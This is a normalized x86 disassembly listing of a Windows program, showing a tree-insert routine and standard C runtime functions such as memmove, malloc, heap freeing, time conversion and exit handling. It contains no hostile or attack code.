call sub_409bf0
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ecx eax
jne r-xdata
mov eax [ esi + 0xc ]
cmp eax [ ecx + 0xc ]
jge r-xdata
mov eax [ esi + 0xc ]
cmp eax [ ecx + 0xc ]
jge r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ecx + 0xc ]
cmp edx [ esi + 0xc ]
jge r-xdata
push esi
push ebx
lea esi [ ebp - 0x8 ]
call sub_409b20
mov eax [ eax ]
pop esi
mov [ edi ] eax
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push esi
push 0x1
push edi
call sub_409bf0
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0xc ]
cmp [ ecx + 0xc ] eax
jge r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ecx
call sub_409e10
mov ecx [ ebp - 0x4 ]
mov eax [ esi + 0xc ]
cmp [ ecx + 0xc ] eax
jge r-xdata
push esi
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ecx
call sub_409990
mov eax [ ebp - 0x4 ]
cmp eax [ ebx + 0x4 ]
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
push esi
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x15 ] 0x0
push esi
jne r-xdata
mov ecx [ esi + 0xc ]
cmp ecx [ eax + 0xc ]
jge r-xdata
push 0x0
push edi
call sub_409bf0
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
push 0x1
push edi
call sub_409bf0
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x1
push edi
mov ecx eax
call sub_409bf0
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_409b20
push ebp
mov ebp esp
sub esp 0x8
mov edx [ ebp + 0x8 ]
push ebx
push edi
mov edi [ edx + 0x4 ]
mov eax [ edi + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov cl 0x1
mov [ ebp - 0x8 ] cl
jne r-xdata
mov ebx edi
mov [ ebp - 0x4 ] ebx
test cl cl
je r-xdata
mov ecx [ ebp + 0xc ]
mov ebx [ ecx + 0xc ]
mov eax [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push eax
cmp ecx [ eax + 0xc ]
jge r-xdata
mov eax [ edx + 0x4 ]
cmp edi [ eax ]
jne r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
call sub_40a0eb
add esp 0x4
pop edi
mov [ esi ] ebx
mov [ esi + 0x4 ] 0x0
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp + 0xc ]
push ecx
mov ecx edi
mov ebx edx
call sub_409bf0
mov edx [ eax ]
pop edi
mov [ esi ] edx
mov [ esi + 0x4 ] 0x1
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x4 ]
call sub_409e10
mov ebx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push ecx
push 0x1
lea eax [ ebp + 0xc ]
push eax
mov ecx edi
mov ebx edx
call sub_409bf0
mov ecx [ eax ]
pop edi
mov [ esi ] ecx
mov [ esi + 0x4 ] 0x1
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp ebx [ eax + 0xc ]
mov edi eax
setl cl
mov [ ebp - 0x8 ] cl
test cl cl
je r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_409bf0
push ebp
mov ebp esp
mov edx [ ebx + 0x8 ]
cmp edx 0x1ffffffe
jb r-xdata
inc edx
push edi
mov edi [ ebp + 0x10 ]
mov [ ebx + 0x8 ] edx
mov [ edi + 0x4 ] ecx
mov edx [ ebx + 0x4 ]
xor al al
cmp ecx edx
jne r-xdata
mov eax [ ebp + 0x10 ]
push eax
call sub_40a0eb
add esp 0x4
push r--data
call sub_409ef7
cmp [ ebp + 0xc ] al
je r-xdata
mov [ edx + 0x4 ] edi
mov ecx [ ebx + 0x4 ]
mov [ ecx ] edi
mov edx [ ebx + 0x4 ]
jmp r-xdata
mov [ ecx + 0x8 ] edi
mov edx [ ebx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ ecx ] edi
mov edx [ ebx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x8 ] edi
mov edx [ edi + 0x4 ]
mov ecx edi
cmp [ edx + 0x14 ] al
jne r-xdata
mov [ edx ] edi
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
mov [ ecx + 0x14 ] 0x1
pop edi
pop ebp
retn 0xc
push esi
mov esi [ esi ]
cmp [ esi + 0x14 ] al
jne r-xdata
mov esi [ esi + 0x8 ]
cmp [ esi + 0x14 ] al
jne r-xdata
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx + 0x8 ]
mov edi [ esi ]
mov [ edx + 0x8 ] edi
mov edi [ esi ]
cmp [ edi + 0x15 ] al
jne r-xdata
mov ecx edx
mov edx [ ecx ]
mov esi [ edx + 0x8 ]
mov [ ecx ] esi
mov esi [ edx + 0x8 ]
cmp [ esi + 0x15 ] al
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x14 ] al
je r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx ]
mov edi [ esi + 0x8 ]
mov [ edx ] edi
mov edi [ esi + 0x8 ]
cmp [ edi + 0x15 ] al
jne r-xdata
mov ecx edx
mov edx [ ecx + 0x8 ]
mov esi [ edx ]
mov [ ecx + 0x8 ] esi
mov esi [ edx ]
cmp [ esi + 0x15 ] al
jne r-xdata
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ebx + 0x4 ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
mov esi [ edx + 0x4 ]
cmp edx [ esi ]
jne r-xdata
pop esi
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ebx + 0x4 ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
mov edi [ edx + 0x4 ]
cmp edx [ edi ]
jne r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
mov esi [ ecx + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov edi [ edx + 0x4 ]
cmp edx [ edi + 0x8 ]
jne r-xdata
mov [ edi + 0x4 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov esi [ ecx + 0x4 ]
cmp ecx [ esi ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ edi ] esi
jmp r-xdata
mov [ esi ] edx
mov [ esi ] edx
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov [ edi ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov edi [ ebp + 0x10 ]
mov [ edx + 0x4 ] esi
mov [ esi + 0x8 ] edx
mov [ esi ] edx
jmp r-xdata
mov [ edx ] ecx
mov [ ecx + 0x4 ] edx
sub_409e10
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov edx [ ecx ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov [ eax ] ecx
retn
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ eax ]
cmp edx [ ecx ]
jne r-xdata
mov [ eax ] edx
retn
nop
retn
mov [ eax ] ecx
mov [ eax ] ecx
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov edx ecx
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_409e70
push ebp
mov ebp esp
sub esp 0x10
push 0x18
call sub_40a3e1
xor edx edx
add esp 0x4
cmp eax edx
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
call sub_40a4e9
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_40aef3
int3
mov ecx [ esi + 0x4 ]
mov [ eax ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x8 ] ecx
lea ecx [ eax + 0xc ]
mov [ eax + 0x14 ] dx
cmp ecx edx
je r-xdata
mov esp ebp
pop ebp
retn
mov edx [ edi ]
mov [ ecx ] edx
mov edx [ edi + 0x4 ]
mov [ ecx + 0x4 ] edx
sub_409ef7
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_40a4e9
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_40aef3
int3
sub_409f44
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_40a4e9
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_40aef3
int3
sub_409f91
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40a545
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a0eb
pop ecx
sub_409fcc
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_40aa97
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40aa55
pop ecx
mov [ esi ] eax
pop esi
sub_40a006
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40b063
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov eax esi
pop esi
leave
retn
cmp [ ebp - 0x4 ] eax
je r-xdata
call sub_40aa97
test eax eax
je r-xdata
call sub_40aa97
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
sub_40a079
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
push 0x0
add eax 0x2ac18000
push 0x989680
adc ecx 0xfe624e21
push ecx
push eax
call sub_40b610
cmp edx 0x7
jl r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
jg r-xdata
leave
retn
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
or eax 0xffffffff
mov edx eax
cmp eax 0x93406fff
jbe r-xdata
sub_40a0f6
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_40a14b
mov edi edi
push esi
call sub_40b0e5
mov esi eax
push esi
call sub_40bf54
push esi
call sub_40bdba
push esi
call sub_40bdab
push esi
call sub_40bd9c
push esi
call sub_40bb97
push esi
call sub_40bb86
add esp 0x18
pop esi
retn
sub_40a17e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_40a1a2
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_40c111
push r--data
push r--data
call sub_40a17e
pop ecx
pop ecx
test eax eax
jne r-xdata
push rw-data
call sub_40c1d0
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_40c0eb
call sub_40c0ae
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_40c1d0
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_40a239
push 0x20
push r--data
call sub_40c290
push 0x8
call sub_40bacf
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40a364
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_40c2d5
retn
mov [ rw-data ] 0x1
push 0x8
call sub_40b9f6
pop ecx
push [ ebp + 0x8 ]
call sub_40a121
mov [ ebp - 0x20 ] r--data
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_40b0e5
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_40b0e5
mov [ edi ] eax
call ebx
push [ rw-data ]
call esi
mov ebx eax
push [ rw-data ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_40a3e1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_40a9c1
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_40bf63
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov edi rw-data
mov esi r--data
jne r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_40a577
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
call sub_40aef3
int3
or [ rw-data ] 0x1
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] r--data
call sub_40a461
push sub_412ccf
mov [ rw-data ] esi
call sub_40c0ae
pop ecx
sub_40a48b
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
push [ ebp + 0x8 ]
call sub_40c6f0
lea esi [ eax + 0x1 ]
push esi
call sub_40a9c1
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
pop esi
push [ ebp + 0x8 ]
push esi
push eax
call sub_40c68d
add esp 0xc
mov [ edi + 0x8 ] 0x1
sub_40a4e9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_40a48b
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40a510
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
call sub_40a4cb
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
push [ esi + 0x4 ]
mov ecx edi
call sub_40a48b
jmp r-xdata
sub_40a550
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_40a4cb
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a0eb
pop ecx
sub_40a577
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_40a510
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40a5a0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_40a624 ]
jmp [ ecx * 4 + jump_table_40a6a4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40a710 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_40a8ac ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_40a7b0 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40a8ac ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40a710 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40a8ac ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40a710 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40a710 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40a710 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40a8ac ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40a8ac ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40a8ac ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_40a901
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push esi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
lea esi [ ebx - 0x4 ]
test esi esi
je r-xdata
pop ebx
leave
retn
cmp esi ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop esi
inc eax
inc esi
inc ecx
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] esi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
sub_40a9c1
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_40bf63
pop ecx
call sub_40aa97
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_40c654
push 0x1e
call sub_40c4a5
push 0xff
call sub_40a121
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
